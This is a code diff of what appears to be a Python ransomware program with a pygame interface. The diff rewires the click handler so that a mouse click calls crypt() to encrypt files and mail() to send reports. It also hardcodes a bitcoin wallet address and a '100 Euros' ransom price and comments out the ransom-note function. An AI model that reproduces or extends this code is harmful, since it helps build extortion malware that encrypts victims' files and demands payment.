@@ -79,7 +79,13 @@ def Windows():
 		#Event button click
 		elif event.type == MOUSEBUTTONUP:              
                 	if event.button == 1:                      
-                    		if image_rect.collidepoint(event.pos):                  
+                    		if image_rect.collidepoint(event.pos):
+					mail(textexe)
+    					crypt(text1, pwd, path, bitcoin, price,verif)
+    					mail(textfin)
+    					crypt(text2, pwd, path, bitcoin, price,verif)
+    					mail(textall)
+
                         		nouveaufond = pygame.image.load("message.JPG").convert()
 					nouveaufond = pygame.transform.scale(nouveaufond, (640, 480))
                         		fenetre.blit(nouveaufond, (0,0))
@@ -90,13 +96,6 @@ def Windows():
 	fenetre.blit(textI.get_surface(), (138, 325))
     	pygame.display.update()
 
-
-
-    mail(textexe)
-    crypt(text1, pwd, path, bitcoin, price,verif)
-    mail(textfin)
-    crypt(text2, pwd, path, bitcoin, price,verif)
-    mail(textall)
 
 bitcoin='18SXEt2zLcmYKCbZ6fx36QrmA2NuPAE9kq'
 price='100 Euros'
@@ -125,7 +124,7 @@ def crypt(text, pwd, path, bitcoin, price,verif ):
                     archivocifrado.close()
                 except (IOError, RuntimeError, TypeError, NameError, OSError):
                     pass
-    howto(l)
+    #howto(l)
 
 def howto(l):
 
